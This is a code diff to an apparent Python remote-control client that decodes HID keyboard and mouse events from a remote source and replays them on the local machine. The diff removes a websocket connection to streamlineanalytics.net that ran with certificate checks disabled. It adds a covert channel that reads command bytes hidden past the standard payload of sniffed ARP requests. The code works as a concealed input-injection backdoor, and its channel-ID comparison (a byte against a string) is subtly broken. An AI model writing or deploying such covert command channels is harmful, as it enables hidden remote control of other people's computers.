@@ -1,36 +1,36 @@
-import websocket
-import ssl
 import rel
 import os
 from dotenv import load_dotenv
 from event import decode_hid_event, replay_event
+from scapy.all import sniff, ARP
 
 load_dotenv()
 
-RELAY_SERVER_APP_NAME = os.environ['RELAY_SERVER_APP_NAME']
+CHANNEL_ID = os.environ['CHANNEL_ID']
 
-def on_message(ws, message):
+def process_message(message):
     hid_event = decode_hid_event(message)
     replay_event(hid_event)
 
-def on_error(ws, error):
-    print(error)
 
-def on_close(ws, close_status_code, close_msg):
-    print("### closed ###")
-
-def on_open(ws):
-    print("Opened connection")
-    ws.send_text(f'dest/{RELAY_SERVER_APP_NAME}')
+# Packet handler function
+def process_packet(packet):
+    if ARP in packet and packet[ARP].op == 1:  # ARP request
+        # Extract extra payload data
+        arppayload = bytes(packet[ARP])[28:]  # Start after standard ARP payload
+        if len(arppayload) == 0 or arppayload[0] != CHANNEL_ID:
+            return
+        extra_data = arppayload[1:]
+        if len(extra_data) > 0:
+            print(f"Extracted extra data: {extra_data}")
+            try:
+                process_message(extra_data)
+            except:
+                pass
 
 if __name__ == "__main__":
-    websocket.enableTrace(False)
-    ws = websocket.WebSocketApp(f"wss://streamlineanalytics.net:10010",
-                              on_open=on_open,
-                              on_message=on_message,
-                              on_error=on_error,
-                              on_close=on_close)
+    print("Starting packet capture on ARP...")
+    sniff(filter="arp", prn=process_packet, store=0)
 
-    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE}, dispatcher=rel, reconnect=5)  # Set dispatcher to automatic reconnection, 5 second reconnect delay if connection closed unexpectedly
     rel.signal(2, rel.abort)  # Keyboard Interrupt
     rel.dispatch()
